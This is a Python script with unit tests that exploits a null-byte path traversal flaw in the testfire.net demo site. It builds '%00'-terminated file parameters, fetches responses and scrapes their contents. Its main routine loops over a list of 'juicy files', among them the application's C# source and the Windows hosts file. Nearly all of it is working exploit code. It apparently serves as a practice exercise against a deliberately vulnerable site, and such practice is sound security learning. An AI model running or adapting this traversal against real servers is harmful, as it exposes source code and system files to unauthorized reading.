import os
import re
import unittest

import requests
from joblib import Memory

memory = Memory(cachedir=os.path.join(os.path.dirname(__file__), '__pycache__'), verbose=0)

_URL = r"http://www.testfire.net/default.aspx"
_PARAMS = r"content={target}{nullbyte}.txt"
_OUTPUT_DIR = "nullbyte_data/"

_CONTENT_REXP = '_ctl0__ctl0_Content_Main_lblContent">(.+?)</span>'
_CONTENT_REXP = re.compile(_CONTENT_REXP, re.MULTILINE | re.DOTALL)

_JUICY_FILES = [
    '../robots.txt',
    '../default.aspx.cs',
    '../../../../Windows/System32/drivers/etc/hosts'
]


class ShitIsWackException(Exception):
    pass


def construct_params(params=_PARAMS, target="passwords.txt", nullbyte='%00'):
    return params.format(target=target, nullbyte=nullbyte)


@memory.cache
# We do this so that we don't spam them.
# To clear the cache, delete `__pycache__/uglyfoldername/`.
def make_GET(url=_URL, target="passwords.txt") -> requests.Response:
    """
    Form and execute an HTTP GET request for a given file.
    """
    params = construct_params(target=target)

    return requests.get(url, params=params)


def extract_content(response: requests.Response) -> str:
    """
    :param response: An HTTP response with data inside it.
    :return: The data.
    """
    s = response.content.decode('utf-8')

    rexp = re.findall(_CONTENT_REXP, s)

    if rexp == []:
        raise ShitIsWackException("Couldn't extract content from ", response)

    return rexp[0]


def file_from_target(target='../robots.txt'):
    return extract_content(make_GET(target=target))


class TestURIConstruction(unittest.TestCase):

    def test_muh_func_pls(self):
        self.assertEqual(construct_params(target="your_wallet.exe"),
                         r"content=your_wallet.exe%00.txt")


class TestGET(unittest.TestCase):

    def test_errorcodes(self):
        # This should error, hence the 500 AKA `Internal Error`
        self.assertEqual(make_GET(target="nonExistentFile.exe").status_code, 500)

        # Robots.txt should exist, hence the 200 AKA `OK`
        self.assertEqual(make_GET(target="../robots.txt").status_code, 200)

    def test_filegrabbing(self):
        # THE BIG ONE!
        self.assertTrue('sss@123.com' in file_from_target('../robots.txt'))


if __name__ == '__main__':

    # Do we test? ( ͡° ͜ʖ ͡°)
    _PULL_THE_LEVER_KRONK = False

    if _PULL_THE_LEVER_KRONK:
        print("TESTS!")
        unittest.main()
    else:
        print("We aren't testing stuff.")

    for fileuri in _JUICY_FILES:
        print("+", "=" * 80, "+")
        print("|", f"{fileuri:^80s}", "|")
        print("+", "=" * 80, "+")

        print(file_from_target(fileuri))


